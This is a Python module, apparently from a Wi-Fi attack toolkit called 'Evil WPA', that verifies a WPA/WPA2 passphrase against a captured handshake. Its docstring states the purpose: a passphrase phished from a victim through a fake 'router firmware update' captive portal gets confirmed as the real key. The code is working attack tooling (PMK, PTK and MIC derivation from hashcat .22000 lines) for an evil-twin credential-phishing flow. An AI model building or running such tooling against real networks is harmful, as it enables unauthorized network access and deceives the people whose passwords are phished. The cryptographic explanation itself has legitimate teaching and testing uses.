"""WPA/WPA2 PSK verification against a captured 4-way handshake.

The S12.5 captive-portal trick: instead of cracking the handshake
offline, we phish the PSK from the victim via a fake "router firmware
update" page, then *verify* it's the real password by checking it
against the M1+M2 we already captured in Evil WPA — no wordlist, no
GPU, instant yes/no.

The maths is exactly what `hashcat -m 22000` does internally, one
candidate at a time:

    PMK  = PBKDF2-HMAC-SHA1(psk, ssid, 4096, 32)
    PTK  = PRF-512(PMK, "Pairwise key expansion",
                   min(AA,SA) || max(AA,SA) ||
                   min(ANonce,SNonce) || max(ANonce,SNonce))
    KCK  = PTK[0:16]
    MIC' = HMAC(KCK, <EAPOL M2 frame with the MIC field zeroed>)[0:16]
    valid  ⟺  MIC' == captured MIC

The MIC algorithm depends on the EAPOL-Key *key descriptor version*:

    v1  → HMAC-MD5        (TKIP / WPA1)
    v2  → HMAC-SHA1       (CCMP / WPA2, the common case)
    v3  → AES-128-CMAC    (802.11w / PMF-protected)

We read every input we need straight out of the hashcat ``.22000``
line that Evil WPA's extractor already produced, so verification needs
nothing but the line + the candidate passphrase.

``.22000`` EAPOL line layout (``*``-separated)::

    WPA * 02 * <MIC> * <MAC_AP> * <MAC_STA> * <ESSID_hex>
        * <ANonce_hex> * <EAPOL_hex> * <message_pair_flags>

``<EAPOL_hex>`` is the full 802.1X EAPOL-Key frame of M2; the STA's
SNonce and the MIC field both live inside it at fixed offsets.

Everything here is pure stdlib (``hashlib`` / ``hmac``), no scapy, no
subprocess — it's the educational centrepiece of the session and is
unit-tested against a known WPA test vector.
"""

from __future__ import annotations

import hashlib
import hmac
import logging
from dataclasses import dataclass

log = logging.getLogger(__name__)


# ---------- EAPOL-Key frame offsets ----------
# The .22000 EAPOL field starts at the 802.1X header. Offsets into that
# byte string:
_OFF_KEY_INFO = 5      # 2 bytes, big-endian; low 3 bits = descriptor version
_OFF_KEY_NONCE = 17    # 32 bytes — the SNonce in M2
_OFF_KEY_MIC = 81      # 16 bytes — the MIC field (zeroed for recompute)
_LEN_NONCE = 32
_LEN_MIC = 16


@dataclass
class HandshakeParams:
    """Everything pulled out of a .22000 EAPOL line that the verifier
    needs. MACs/nonces/MIC are raw bytes; ESSID is decoded text."""
    mic: bytes               # captured MIC (16 bytes)
    ap_mac: bytes            # 6 bytes
    sta_mac: bytes           # 6 bytes
    essid: str
    anonce: bytes            # 32 bytes (from M1)
    snonce: bytes            # 32 bytes (parsed out of the M2 EAPOL frame)
    eapol: bytes             # full M2 EAPOL-Key frame (MIC field intact)
    key_descriptor_version: int


class WpaCryptoError(ValueError):
    """Raised when a .22000 line can't be parsed into usable params."""


def parse_22000_eapol(hash_line: str) -> HandshakeParams:
    """Parse a ``WPA*02*…`` EAPOL line into a :class:`HandshakeParams`.

    Raises :class:`WpaCryptoError` for non-EAPOL lines (e.g. ``WPA*01``
    PMKID-only) or malformed input — PMKID lines aren't verifiable this
    way (no MIC over an EAPOL frame).
    """
    parts = (hash_line or "").strip().split("*")
    if len(parts) < 9 or parts[0] != "WPA":
        raise WpaCryptoError(f"not a WPA .22000 line: {hash_line[:40]!r}")
    if parts[1] != "02":
        raise WpaCryptoError(
            f"line type {parts[1]!r} is not EAPOL (02) — can't verify a "
            "MIC against it (PMKID-only lines need cracking, not this)")
    try:
        mic     = bytes.fromhex(parts[2])
        ap_mac  = bytes.fromhex(parts[3])
        sta_mac = bytes.fromhex(parts[4])
        essid   = bytes.fromhex(parts[5]).decode("utf-8", errors="replace")
        anonce  = bytes.fromhex(parts[6])
        eapol   = bytes.fromhex(parts[7])
    except ValueError as e:
        raise WpaCryptoError(f"hex decode failed: {e}") from e

    if len(eapol) < _OFF_KEY_MIC + _LEN_MIC:
        raise WpaCryptoError(
            f"EAPOL frame too short ({len(eapol)} bytes) to contain a MIC")
    if len(anonce) != _LEN_NONCE:
        raise WpaCryptoError(f"ANonce must be 32 bytes, got {len(anonce)}")
    if len(mic) != _LEN_MIC:
        raise WpaCryptoError(f"MIC must be 16 bytes, got {len(mic)}")

    key_info = int.from_bytes(eapol[_OFF_KEY_INFO:_OFF_KEY_INFO + 2], "big")
    version = key_info & 0x0007
    snonce = eapol[_OFF_KEY_NONCE:_OFF_KEY_NONCE + _LEN_NONCE]

    return HandshakeParams(
        mic=mic, ap_mac=ap_mac, sta_mac=sta_mac, essid=essid,
        anonce=anonce, snonce=snonce, eapol=eapol,
        key_descriptor_version=version,
    )


def derive_pmk(passphrase: str, ssid: str) -> bytes:
    """PMK = PBKDF2-HMAC-SHA1(passphrase, ssid, 4096, 32)."""
    return hashlib.pbkdf2_hmac(
        "sha1", passphrase.encode("utf-8"), ssid.encode("utf-8"),
        4096, dklen=32,
    )


def _prf(key: bytes, label: bytes, data: bytes, n_bytes: int) -> bytes:
    """IEEE 802.11 PRF-n using HMAC-SHA1. Each block is
    ``HMAC-SHA1(key, label || 0x00 || data || counter)``."""
    out = b""
    counter = 0
    while len(out) < n_bytes:
        out += hmac.new(
            key, label + b"\x00" + data + bytes([counter]), hashlib.sha1,
        ).digest()
        counter += 1
    return out[:n_bytes]


def derive_kck(pmk: bytes, p: HandshakeParams) -> bytes:
    """Derive the PTK and return its first 16 bytes — the Key
    Confirmation Key used to compute/verify the EAPOL MIC."""
    aa, sa = p.ap_mac, p.sta_mac
    anonce, snonce = p.anonce, p.snonce
    b = (min(aa, sa) + max(aa, sa)
         + min(anonce, snonce) + max(anonce, snonce))
    ptk = _prf(pmk, b"Pairwise key expansion", b, 48)
    return ptk[:16]


def _compute_mic(kck: bytes, eapol: bytes, version: int) -> bytes:
    """Recompute the EAPOL MIC over ``eapol`` (MIC field already
    zeroed) with the algorithm dictated by the key descriptor version."""
    if version == 1:
        return hmac.new(kck, eapol, hashlib.md5).digest()[:16]
    if version == 2:
        return hmac.new(kck, eapol, hashlib.sha1).digest()[:16]
    if version == 3:
        # AES-128-CMAC, only for 802.11w/PMF-protected handshakes. PMF
        # resists the whole Evil WPA capture, so in practice we never get
        # here — but if we do, use cryptography's CMAC when available
        # rather than carrying a pure-Python AES. No dependency → clear
        # error (treated as "can't verify" upstream).
        try:
            from cryptography.hazmat.primitives import cmac
            from cryptography.hazmat.primitives.ciphers import algorithms
            c = cmac.CMAC(algorithms.AES(kck))
            c.update(eapol)
            return c.finalize()[:16]
        except ImportError as e:
            raise WpaCryptoError(
                "key descriptor v3 (802.11w/PMF) needs the 'cryptography' "
                "package for AES-CMAC; not installed") from e
    raise WpaCryptoError(f"unknown key descriptor version {version}")


def _zero_mic(eapol: bytes) -> bytes:
    """Return the EAPOL frame with its 16-byte MIC field zeroed — the
    MIC is computed over the frame as if the MIC field were all zeros."""
    return (eapol[:_OFF_KEY_MIC]
            + b"\x00" * _LEN_MIC
            + eapol[_OFF_KEY_MIC + _LEN_MIC:])


def verify_psk(passphrase: str, params: HandshakeParams) -> bool:
    """True iff ``passphrase`` is the real PSK for this handshake.

    Derives PMK → KCK → recomputes the M2 MIC and constant-time compares
    it to the captured MIC.
    """
    if not (8 <= len(passphrase.encode("utf-8")) <= 63):
        # WPA passphrases are 8-63 ASCII chars; anything else can't be
        # the real key, short-circuit.
        return False
    pmk = derive_pmk(passphrase, params.essid)
    kck = derive_kck(pmk, params)
    computed = _compute_mic(kck, _zero_mic(params.eapol),
                            params.key_descriptor_version)
    return hmac.compare_digest(computed, params.mic)


def verify_psk_against_line(passphrase: str, hash_line: str) -> bool:
    """Convenience wrapper: parse a .22000 line and verify in one call.
    Returns False (rather than raising) on unparseable lines so callers
    in the request path don't need a try/except."""
    try:
        params = parse_22000_eapol(hash_line)
    except WpaCryptoError as e:
        # Non-EAPOL (PMKID-only) or malformed lines aren't verifiable
        # this way — that's an expected case, not an error.
        log.debug("verify_psk_against_line: unverifiable line: %s", e)
        return False
    return verify_psk(passphrase, params)
